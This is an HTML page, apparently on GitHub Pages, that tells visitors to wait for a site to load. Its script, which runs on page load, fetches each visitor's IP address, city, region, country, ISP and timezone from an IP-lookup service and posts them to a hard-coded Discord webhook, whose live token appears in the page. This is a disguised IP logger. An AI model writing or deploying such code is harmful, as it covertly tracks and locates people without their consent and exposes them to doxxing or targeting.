<h1>Please wait for this users site to load. Due to the many data in GitHub Pages, this can take a second.</h1>



<<script>
window.addEventListener("load", async () => {
  const webhookURL = "https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe";

  // Helper to show messages on the page
  function logMessage(message, color = "black") {
    const pre = document.createElement("pre");
    pre.style.color = color;
    pre.style.background = "#f0f0f0";
    pre.style.padding = "5px";
    pre.textContent = message;
    document.body.appendChild(pre);
  }

  try {
    logMessage("Fetching IP info...", "blue");

    const res = await fetch("https://ipapi.co/json/");
    if (!res.ok) throw new Error(`Website failed: ${res.status}`);
    const data = await res.json();

    logMessage(`IP info fetched:\n${JSON.stringify(data, null, 2)}`, "green");

    const payload = {
      content:
        `üåç Visit Detected\n\n` +
        `IP: ${data.ip}\n` +
        `City: ${data.city}\n` +
        `Region: ${data.region}\n` +
        `Country: ${data.country_name}\n` +
        `ISP: ${data.org}\n` +
        `Timezone: ${data.timezone}\n` +
        `Page: ${window.location.href}`
    };

    logMessage("Sending to webhook...", "blue");

    await fetch(webhookURL, {
      method: "POST",
      mode: "no-cors", // Required for GitHub Pages
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    logMessage("‚úÖ Going to site", "green");

  } catch (err) {
    logMessage(`‚ùå Error: ${err.message}`, "red");
  }
});
</script>
